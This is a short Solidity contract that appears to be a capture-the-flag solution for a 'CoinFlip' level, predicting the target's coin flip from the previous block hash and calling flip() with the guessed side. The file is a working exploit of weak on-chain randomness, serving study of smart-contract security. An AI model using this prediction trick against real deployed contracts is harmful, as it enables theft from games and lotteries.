// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../@openzeppelin/contracts/math/SafeMath.sol";
import "./level.sol";

contract Solution {
    using SafeMath for uint256;

    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _address) public {
        coinFlip = CoinFlip(_address);
    }

    function solve() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 flip = blockValue.div(FACTOR);
        bool side = flip == 1;
        coinFlip.flip(side);
    }
}
